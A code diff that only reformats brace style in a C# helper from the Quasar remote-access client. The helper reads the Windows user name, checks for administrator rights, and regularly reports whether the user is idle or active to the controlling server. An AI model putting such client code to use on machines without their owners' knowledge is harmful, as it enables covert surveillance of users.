@@ -6,23 +6,17 @@ using Quasar.Client.Networking;
 using Quasar.Common.Enums;
 using Quasar.Common.Messages;
 
-namespace Quasar.Client.Helper
-{
-    public static class WindowsAccountHelper
-    {
+namespace Quasar.Client.Helper {
+    public static class WindowsAccountHelper {
         public static UserStatus LastUserStatus { get; set; }
 
-        public static string GetName()
-        {
+        public static string GetName() {
             return Environment.UserName;
         }
 
-        public static string GetAccountType()
-        {
-            using (WindowsIdentity identity = WindowsIdentity.GetCurrent())
-            {
-                if (identity != null)
-                {
+        public static string GetAccountType() {
+            using (WindowsIdentity identity = WindowsIdentity.GetCurrent()) {
+                if (identity != null) {
                     WindowsPrincipal principal = new WindowsPrincipal(identity);
 
                     if (principal.IsInRole(WindowsBuiltInRole.Administrator))
@@ -37,28 +31,20 @@ namespace Quasar.Client.Helper
             return "Unknown";
         }
 
-        public static void StartUserIdleCheckThread()
-        {
-            new Thread(UserIdleThread) {IsBackground = true}.Start();
+        public static void StartUserIdleCheckThread() {
+            new Thread(UserIdleThread) { IsBackground = true }.Start();
         }
 
-        static void UserIdleThread()
-        {
-            while (!QuasarClient.Exiting)
-            {
+        static void UserIdleThread() {
+            while (!QuasarClient.Exiting) {
                 Thread.Sleep(5000);
-                if (IsUserIdle())
-                {
-                    if (LastUserStatus != UserStatus.Idle)
-                    {
+                if (IsUserIdle()) {
+                    if (LastUserStatus != UserStatus.Idle) {
                         LastUserStatus = UserStatus.Idle;
-                        Program.ConnectClient.Send(new SetUserStatus {Message = LastUserStatus});
+                        Program.ConnectClient.Send(new SetUserStatus { Message = LastUserStatus });
                     }
-                }
-                else
-                {
-                    if (LastUserStatus != UserStatus.Active)
-                    {
+                } else {
+                    if (LastUserStatus != UserStatus.Active) {
                         LastUserStatus = UserStatus.Active;
                         Program.ConnectClient.Send(new SetUserStatus { Message = LastUserStatus });
                     }
@@ -66,8 +52,7 @@ namespace Quasar.Client.Helper
             }
         }
 
-        static bool IsUserIdle()
-        {
+        static bool IsUserIdle() {
             long ticks = Stopwatch.GetTimestamp();
 
             long idleTime = ticks - NativeMethodsHelper.GetLastInputInfoTickCount();
